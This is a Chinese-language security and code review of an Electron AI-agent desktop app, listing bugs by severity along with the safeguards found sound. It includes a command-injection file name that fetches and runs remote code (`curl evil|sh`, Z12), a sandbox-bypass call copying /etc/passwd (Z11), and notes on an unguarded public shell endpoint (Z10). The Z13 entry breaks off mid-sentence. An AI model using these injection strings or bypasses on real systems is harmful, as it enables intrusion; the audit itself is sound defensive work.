## 高严重度

### G1 · 回合落库是裸 `void`，无 `.catch`——静默丢消息

`renderer/stores/sessionStore.ts:6109` — `turn.done`/`error` 分支用
`void api.session.upsertMessages(...)` 持久化本回合，**没有 `.catch`**。同文件其它落库都守卫了
（`:3156`、`:6905`、`:6922`），唯独最要紧的这条没有。同类裸调用还在 `:2431`、`:2470`、`:2520`、
`:5267`、`:6119`。

**失败场景**：网络/401/超时（手机端 `rpc()`，桌面端 IPC 也会 reject）→ 这一轮消息
**永远没存下来，且不告诉任何人**。不是树卸载（异步 reject 不触发渲染抛错），是**无上报的数据丢失**。
（渲染端**没有** `unhandledrejection` 监听器——只有主进程有，见 `main/index.ts:120`。）

### G2 · 手机搜索框：延迟响应盖掉已清空的查询

`renderer/components/mobile/MobileSessionDrawer.tsx:157-173` — 清理函数只 `clearTimeout` 去抖。
一旦 250ms 定时器已触发，`api.session.search(...)` 就在途，`.then(setResults)` **没有序号/取消守卫**。

**失败场景**：输入 "abc"（请求已发）→ 清空输入框（effect 跑 `setResults(null)`、`setSearching(false)`）
→ "abc" 的 promise 回来，把**空查询**的结果又刷上去。开关抽屉（`:150-153` 重置）同样有这个竞态。

### G3 · 消息列表：一行坏数据打死整个对话

`apps/desktop/src/main/store/repositories.ts:1126` — `rowToMessage` 里
`content: JSON.parse(r.content)` **裸解析，没有 try/catch**。同一文件里其它 JSON 列都走
`safeJson`（`sessionSchema.ts:45`），只有 messages 这一条不用。读取路径
`listBySession` → `IPC.SESSION_MESSAGES`（`ipc/claude.ts:511`）。

**失败场景**：库里只要有一行 `content` 是坏的（半截写入、外部改库），这条会话**整条加载不出来**
——渲染端拿到 rejected IPC，不是"少一条消息"而是"对话打不开"。而 messages 恰恰是最容易碰上
半截写入的表。

**方向**：改走 `safeJson`，坏行降级成占位正文并显式报出来（硬规矩 3）。

### G4 · 分支回环的 `pendingLoopBack` 是全局单字段，并发分叉会回环错节点

`apps/desktop/src/main/orchestration/scheduler.ts:735`（字段）、`:1073`（写入）、
`:955-956`（消费）。对照 `presetChoices` 是 `Map<string, BranchChoice>`（`:719`，按节点 key），
这里却是一个标量。

**失败场景**：两个分叉节点同时等人（代码本身支持——`RunState.awaiting` 是列表）。
分叉 A 选了回环边 → `pendingLoopBack = edgeA`；A 的 `settle` 还没跑，B 的 `settle` 先执行，
读到仍是 `edgeA`，于是拿 B 的 id 去 rewind A 的环。用户对 A 点的"再改一轮"静默失效，
或把 B 的环搅乱。

**方向**：改成 `Map<nodeId, edgeId>`，与 `presetChoices` 对称。

### G5 · Codex 回合的「停止」在 `turn/start` 往返窗口内会丢，服务端回合变孤儿

`providers/codex-sdk/CodexAgentSdkProvider.ts` — `activeTurn.turnId` 在 `:534`
**await `turn/start` 之后**才赋值；`interrupt()`（`:657`）只在 `!activeTurn.turnId` 时
`client.dispose()`。

**失败场景**：用户在 `turn/start` 往返途中（`:529`–`:534` 之间）按停止。此刻 `turnId` 仍是
`null`，于是走 dispose；但服务端回合**已经建好**，`if (turnReason === "interrupted" && activeTurn.turnId)`
因 `turnId` 为 null 而跳过 `turn/interrupt` —— 服务端继续跑，没有客户端，**白烧 token**。

**方向**：`turnId` 拿到后补一次 interrupt，或延迟 dispose 到 `turn/start` 返回。

### G6 · Codex 回合完全没有预算止损（中途不报用量）

`providers/codex-sdk/CodexMessageAdapter.ts:355` — `totalProcessedTokens` **只在回合结束时**
（`emitTurnEndSnapshot`）发出。`RuntimeManager.enforceBudget`（`:673`）读的是"最后一次发出的"
`totalProcessedTokens`。

**失败场景**：Codex 跑一个失控回合，`maxTotalTokens` / `maxUsd` **到回合结束才可能触发**——也就是
永远来不及。Claude 侧有原生 `maxTurns`/`maxBudgetUsd` 兜底（`ClaudeAgentSdkProvider.ts:869`），
Codex 的 `turnOverrides`（`:513`）**一个都没传**。

**方向**：Codex 中途也发 usage 快照；`turnOverrides` 补上预算上限。


## 中严重度

### Z1 · `SessionRepo.delete` 两条语句不在一个事务里

`store/repositories.ts:1045-1052` — 先 `UPDATE sessions SET parent_session_id = NULL`，
再 `DELETE FROM sessions`，**没有** `BEGIN/COMMIT`（同文件的 `replaceAll`/`upsertMany`/
`reorder` 都包了）。若 DELETE 因意外约束抛错，库里留下"子会话已摘掉父指针、主会话还在"的半状态，
后续任意写操作会把它落盘。

### Z2 · Codex「总是允许」升格成服务端 `acceptForSession`，切权限模式后仍生效

`providers/codex-sdk/CodexAgentSdkProvider.ts:956-982`（`decideApproval`）—— 一次"总是允许"
升级为 `acceptForSession`（服务端、整个 thread 生效）。用户随后把权限模式改回"只读"，
服务端**照样自动放行**匹配的 bash。宿主的 `alwaysAllowedTools` 在换模式时也不清
（`ApprovalBridge.setPermissionMode:120`）。即"一次授权越界到后续所有模式"。

### Z3 · Claude 中途 usage 快照按"单次调用"计入，`maxTotalTokens` 预算迟到

`providers/claude-sdk/SdkMessageAdapter.ts:1240` 在每个带 usage 的 `message_delta` 都发
`tokenUsage`；`publishTokenUsageSnapshot:1900` 把它当"本轮累计"。一次多调用的轮次里，
中途快照只反映**某一次调用**的处理量，`enforceBudget`（`RuntimeManager.ts:673`）据此设
`budgetTokens`，导致预算**晚触发**（少算）。路径 C 到轮末才纠正。

### Z4 · 旧快照丢过 picks 仍可续跑，分叉两边可能都执行

`orchestration/runStore.ts:222-227`（`decodeSnapshot` 宽松路径）+ `scheduler.ts:871-875`
（`edgeLive`）。没有 `workflowRevision` 的老快照即便 `chosen` 被丢掉也返回（非 null），
`resumableRun` 只在 decode 返回 null 时才拒。`edgeLive` 在 `chosen` 缺失时判 true →
**分叉的两边都派发**。有 revision 的快照走 pinned 路径（`:209-221`）有护栏，老快照没有。

### Z5 · 变量域 `conditionOutcome` 读全体节点 outcomes，而非仅上游

`orchestration/scheduler.ts:1144`（`conditionOutcome`）→ `templateScopeOf`（`:1286-1292`）
读 `this.outcomes.get(n.id)` 对**所有**节点。条件节点被派发时上游已 success 这一点兜住了大部分，
但引用一个"非依赖、状态为 unselected"的节点会读到它的值。**置信度较低**，记为范围过宽的隐患。

### Z6 · Codex `waitTurnDone()` 可被消费两次，第二次等待者挂着直到 2s 兜底

`providers/codex-sdk/CodexMessageAdapter.ts:198`（单 resolver）+ `CodexAgentSdkProvider.ts:540`
与 `:553` 两次调用。abort 路径下 `turnEnded` 仍 false，`:553` 的 race **替换**掉
`turnDoneResolve`，孤立前一个 promise。当前靠 2s 宽限计时器不挂死，但 `beginCorrectiveTurn()`
（`:177`）会置空 resolver 而不 resolve —— 跨该边界的等待者永不完结。脆弱，非当前死锁。

### Z7 · LSP 四个文档同步接口静默吞错，坏路径表现为"没有诊断"

`ipc/lsp.ts:130-165` — `LSP_OPEN_DOC` / `CLOSE_DOC` / `DID_CHANGE` / `DID_SAVE` 都是
`try { parse; await ... } catch { log.warn }`，**返回 `void`**（`undefined`，渲染端无从分辨成败）。
而 `LspManager.openDocument` 会真抛护栏错（`LspManager.ts:1597` "工作区路径不是已知项目"、
`:1607` "文件路径不在任何已知项目内"）。对照同文件 `LSP_REQUEST`（`:168`）把同样错误整形成
`{ error: { code, message } }`。

**失败场景**：渲染端打开一个 `workspacePath` 已过期/被改名的文件 → LSP 静默停更，**零信号**，
用户只看到"没有报错也没有补全"。

### Z8 · 三个死接口（preload 暴露，渲染端零调用）

- `notification.focusSession` — `preload/index.ts:150` / `notifications.ts:27`。**注意**：推流频道
  `notification:focusSession` 是在用的，死的只有 invoke 那一个。
- `voice.getModelDir` — `preload/index.ts:138` / `voice.ts:131`（只用了 `setModelDir`）。
- `library.restoreItems` — `preload/index.ts:285` / `library.ts:215`。这条更实：**回收站没有"恢复"
  按钮**，条目只能靠 CLI/AI 恢复。

### Z9 · `LspRequestSchema.params` 是 `z.unknown()` 且无 method 白名单

`packages/contracts/src/ipc/lsp.ts:203` → 原样转发给语言服务器（`lsp.ts:173`）。契约白名单了
`language` 却没白名单 `method`。风险低于 Z7（LSP 二进制是用户自己装的），但属信任边界直通。

### Z10 · 公开 MCP 端点：URL 里的密钥是唯一门槛，且工具含 `agent_bash`

`providers/bridge/publicMcpServer.ts:318` 用 URL 路径里的 32 字节 secret 做门禁，
`publicMcpSession.ts:559/581/589` 绑一个 `bypassPermissions` 合成会话，
`webToolHost.ts:297` 对 `audience:"public"` **无审批卡**，工具有 `agent_bash`（`spawn(shell:true)`）。
源码自己写明"拿到链接的人 = 完全控制这台机器"（`publicMcpServer.ts:36`）。真正的风险是
**密钥在 URL 里**，会落进 ChatGPT/代理/隧道日志与浏览器历史——读到一行日志就拿到机器。
非代码 bug，但是当前最大的暴露面。

### Z11 · 公开沙箱可被 `agent_bash` 绕过（设计取舍）

`mcp/agentTools.ts:190` 注释直接承认"沙箱是**可绕过的**"，`sandboxBashWriteDenial`（`:226`）
只认 `>`/`tee`/`dd of=`/`sed -i`，遇 `$`/反引号直接 `continue`（`:229`）。于是公网调用
`agent_bash {command:"cp /etc/passwd /tmp/x"}` 可写到沙箱外。源码标注为刻意取舍，但与 Z10 叠加后，
`PUBLIC_INSTRUCTIONS`（`mcpEndpoint.ts:221`）承诺的"锁定在一个项目"并未被强制执行。

### Z12 · 工作流命令节点：触发器变量原样插进 `shell:true` 命令

`orchestration/commandRunner.ts:115` 用 `spawn(command,{shell:true})`；命令串经
`expandTriggerVars`（`triggerVars.ts:69-82`）把 `{{trigger.*}}` **逐字**替换——包括文献标题、
文件路径、事件载荷等来自文件名/远端内容的字符串。如 `python process.py "{{trigger.files}}"`
遇到名为 `a"; curl evil|sh; "` 的文件即注入。仅靠"用户自己写的图 + `workflow.approve` 策略"兜底，
插值本身**不做任何引号/转义**。

### Z13 · `handleInject` 绕过守卫，成为未处理 rejection

`renderer/components/chat/ChatPane.tsx:2278` — `void handleInject()` 裸调。同文件 `sendGuarded`/
`enqueueGuarded`（`:2248-2270`）正是为"别让错误变未处理 rejection"而存在（`:2239-2246` 注释记着

### Z14 · `selectProject` 里 `void api.setting.set` 无 catch

`renderer/stores/sessionStore.ts:3475` — 手机可达（抽屉 → `pickSession` → `selectProject`）。

## 低严重度

### D1 · 循环回环的分叉节点在 `settle` 时提前返回，`inFlightNodeIds` 不清

`orchestration/scheduler.ts:961` — 回环分叉在 settle 时提前 return，不 `report(node.settled)`，
于是 `runner.ts:1789` 的 `inFlightNodeIds.delete` 在本趟走不到。该节点留在快照的 in-flight 集里，
直到重新提问才派发——若恰在此窗口崩溃，`workflowReplayError` 会把它当成不可安全重放的节点。

### D2 · 节点执行抛错时丢弃已收集的部分产出

`orchestration/scheduler.ts:1556-1560` — catch 把任何异常收成 `failed` + `summary:""`，
`withOutputCheck` 已拿到的部分 `text`/产物一并丢掉。可接受，但"执行器写了输出又抛"会丢输出。

### D3 · Codex `isForeignThread` 把未知/空 `mainThreadId` 当主线程

`providers/codex-sdk/CodexMessageAdapter.ts:152` — `setMainThreadId` 解析出结果前（`:475`），
任何带 `threadId`、main id 为 null 的子代理线程条目会被路由到主路径——子代理增量泄进主对话，
正是这条路由要防的。窗口很窄。

### D4 · Pi `handleAgentEnd` 未防重复的终态 `agent_end`

`providers/pi-sdk/PiMessageAdapter.ts:285` — 两个终态（`willRetry:false`）的 `agent_end`
会发两次 `turn.done`，只靠 `finalTurnReason` 记账兜。Codex 与 Claude 都有显式重入护栏。

### D5 · `healthCheck` 打断 `for await` 未 `q.return()`

`providers/claude-sdk/ClaudeAgentSdkProvider.ts:1900` — 在 `init` 上 break 而不 `return`，
依赖 GC/进程退出。反复探活可能留下孤立的 `claude` 子进程。（`listCommands:1876` 有 `finally` 兜，对照。）

### D6 · 静态服务器只做字面包含检查，不解析 symlink

`mobile/serveMobileStatic.ts:170-176` — 用 `normalize(join(root,rel))` + `relative()`，
而其它地方统一用 `pathGuard.pathWithin`（会解析 junction/symlink）。产物目录受控，当前不可利用；
`MCODE_WEB_DIST`（`:69`）可指到环境设定的 dev 路径（仍可信目录）。建议对齐 `pathWithin` 做纵深防御。

### D7 · 迁移非单事务，但自愈

`store/db.ts:100-456` — ~28 条 `ALTER TABLE ADD COLUMN` + 回填 + `DROP TABLE` 各自 `run()`，
未包事务。中途崩溃留下半迁移的内存库，但每步幂等（`addColumnIfMissing`、带护栏回填），
且触发立即 `persist()`（`:451-455`）。非持久损坏风险，仅建议包一层事务。

### D8 · `publicMcpStatus()` 把明文 secret 返回渲染端

`providers/bridge/publicMcpServer.ts:358` — 本地渲染端是用户自己的信任边界（同 token 展示），
可接受；但 `secretStore.ts` 对模型 token 是打码的，此处是个对照。

### 安全面（整体设计相当克制）
- `lib/pathGuard.ts` — 解析 `realpath`/junction，悬空 symlink 失败关闭，win32/darwin 大小写归一，
  挡同前缀兄弟目录（`:34-36`）。被 `ipc/files.ts`、`ipc/shell.ts`、terminal/lsp 共用。
- `ipc/files.ts` — 写/建目录/删/重命名/复制都要求 `findContainingWorkspaceRoot`；删除拒绝项目根
  本身（`:737`）；重命名拒绝跨目录与已存在目标；复制从不覆盖。
- 手机 HTTP（`MobileHttpServer.ts`）— 只有 `/api/pair/verify` + `/api/auth/login` 免认证，
  各 16 KB body 上限；token 走 `Authorization` 头，`?token=` 仅限 SSE；配对的手机读不到别的设备
  的 token（`LAN_UNREADABLE_SETTING_KEYS`）。
- `PairingManager.ts` — 常量时间比较 nonce+code，5 次失败作废，有 TTL，可撤销。
- `mobileLogin.ts` — scrypt（N=16384）+ 每 IP 指数退避 + 全局 30/时 锁定，常量时间，假哈希对时。
- 公开 MCP secret 比较用 `timingSafeEqual`，不匹配返 404 而非 401（`:298`）。
- 插件（`pluginManager.ts`）— 名字正则/保留名守卫；`assertSafeArchiveEntryNames` 拒 `../`/绝对路径；
  `inspectArchive` 拒 symlink/hardlink 成员；`git-subdir` 有包含检查。
- Electron（`window.ts:162-167`）— `contextIsolation:true`、`nodeIntegration:false`，权限处理器
  仅限主 webContents；`windowNavigation.ts` 挡非入口导航、拒所有 `window.open`，
  `shell.openExternal` 限 http/https/mailto 且不带凭据。
- `secretStore.ts` — safeStorage 加密，`listPublic` 打码，明文不下渲染端。
- 全仓未发现对不可信输入用 `eval`/`new Function`/动态 `require`。

### 持久化
- **所有生产导出都走 `exportBytes()`**（`db.ts:515` 是唯一调用者）——"导出即重置 pragma"的地基仍成立。
- 关闭顺序：`before-quit` 先 flush 再 close；`persistNowOrThrow`→`cancelScheduledPersist` 递增
  epoch 并清定时器，排队中的 `queueMicrotask`/250ms 兜底不会在关库后触发。
- 整文件重写：`writeSnapshot`（`db.ts:513-538`）`openSync(wx)` + 写 + `fsync` + `rename`，
  staging 文件在 `finally` 里只在自有时清理——无临时文件泄漏，原子替换。
- 事务齐全：`replaceAll`/`upsertMany`/`truncateFromAndInsert`/`ProjectRepo.reorder`/
  `CollectionRepo.move`/`assign` 都包了 ROLLBACK。

### 编排
- **变量替换**（`nodeTemplate.ts`）— 无 `eval`，值只做标量字符串化，`readConditionRef` 比较原始标量。
- **执行器分派**（`executionEngine.ts:118-127`）— 模块能力 kind 被显式排除在模型兜底外、失败关闭。
- **服务端校验**（`workflowValidation.ts`）— 三条硬约束都在纯校验器里强制，save 路径会跑，非仅 UI。
- **续跑重建**（`runStore.decodeSnapshot` + `scheduler.init`）— 已定结果不重跑，rewind 闭包展开
  防陈旧 `skipped`/`unselected`，损坏的 pinned 快照拒绝而非半读。

### IPC 三层
- 从 preload 抽 379 个 `IPC.*` 引用、主进程抽 348 个 `ipc.handle(IPC.*)`，diff 后**三层对齐**：
  每个 handle 频道都有 preload 包装，每个 preload invoke 频道都有 handler。31 个"仅 preload"
  频道都是 `on.*` 推流订阅或 `dialog:pickFolder`（裸字符串注册）。
- 松散契约都在主进程侧再校验：`library.groupsSave`/`suppressSave`（`z.unknown()`）→
  `saveLibraryGroups`/`saveSuppress`；PDF 高亮（`z.array(z.unknown())`）→ `validatePdfHighlight`
  **且**有路径闸；`projectInit.*` → `service.ts:98-219` 全 zod 校验。

### 渲染端 / 状态
- **webApi 一致性**：拉到手机上的共用组件不会调用未映射的命名空间。`EmptyThreadWelcome`、
  `WatchSegment`/`MemoryAssistantButton`、`ChatPane` 的 `api.library.*` 都有 `isElectron` 门或
  try/catch；`RemoteConnectPanel`/`MobileDomainPanel`/`MobileLoginCard` 这些 `api.relay`/`api.mobile`
  的面板在 `AppMobile` 里根本没挂载。
- **useRpc 用法**：21 处调用全是读；没有把写操作藏进 hook。
- **订阅清理**：`useClaudeEvents.ts` 每个订阅都返回退订；`webApi` 的 no-op 频道在 `on` 里显式列出；
  `toastStore`/`sessionStore` 的去抖用 `get()`/模块单例，无陈旧闭包、无卸载后写组件状态。
- **重连/重同步**：`sessionStore.ts:4284-4373` 与 `resyncSessionMessages` 都有序号/`runningBySession`
  守卫；增量缓冲（`:2171-2270`）原子快照、终态事件时冲刷。
- **i18n**：`chat/`、`mobile/`、`layout/`、`ui/` 的 JSX 文本/属性无硬编码中文（仅 JSDoc 示例）；
  zh/en 键集与占位符一致。**渲染端无 `unhandledrejection` 监听器**（只有主进程有）。
- **effect 依赖**：7 处 `exhaustive-deps` 禁用都是刻意且有注释的（仅挂载一次或 ref-for-`t`）；
  未发现死循环依赖。
